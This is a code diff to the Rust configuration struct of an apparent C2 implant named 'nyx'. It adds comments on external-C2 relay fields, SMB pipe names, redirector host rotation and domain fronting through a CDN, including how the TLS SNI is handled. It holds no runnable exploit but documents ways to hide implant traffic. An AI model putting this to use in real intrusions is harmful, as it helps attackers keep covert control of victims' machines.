@@ -43,8 +43,20 @@ pub struct Config {
     /// SMB pipe path (e.g. `\\.\pipe\nyx_abc`). Empty = not configured.
     pub smb_pipe_name: String,
     /// External C2 API host (e.g. "slack.com"). Empty = not configured.
+    ///
+    /// KEPT BY DESIGN — never reaches the wire: the implant POSTs the raw
+    /// encrypted frame to this C2 server's `/extc2/<service>` endpoint, not to
+    /// the third-party API (the server-side relay fans out). Used only as a
+    /// per-implant "channel configured" gate and part of the serialized blob
+    /// layout shared with `build.rs`.
     pub extc2_api_host: String,
     /// External C2 token (bot token / webhook secret). Empty = not configured.
+    ///
+    /// Same contract as [`Config::extc2_api_host`]: a configuration gate that
+    /// never leaves the process — the frame is AEAD-encrypted under the
+    /// session key and the server authenticates it cryptographically. The real
+    /// provider token lives server-side (`NYX_EXTC2_*` env vars in
+    /// `crates/server/src/extc2_relay.rs`).
     pub extc2_token: String,
     // ---- HTTP channel enhancements (spec-7) ----
     /// Comma-separated redirector hosts for host rotation (CS 4.10-style).
@@ -52,8 +64,11 @@ pub struct Config {
     /// rotation, always use server_host directly.
     pub rotation_hosts: String,
     /// Domain-fronting Host header value. When non-empty, this is sent as the
-    /// HTTP `Host:` header (and SNI) while the TCP connection goes to
-    /// `server_host` (the fronting CDN's IP). Empty = no fronting.
+    /// HTTP `Host:` header while the TCP connection goes to `server_host`
+    /// (the fronting CDN's IP). NOTE: WinHTTP derives the TLS SNI from
+    /// `server_host` (the WinHttpConnect host) — there is no API to override
+    /// it — so the CDN must serve `server_host`'s name at the TLS layer AND
+    /// route on the Host header. Empty = no fronting.
     pub fronting_host: String,
     /// Explicit HTTP proxy in `host:port` format. Empty = use WinInet default
     /// (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY). When set, WinHTTP routes through
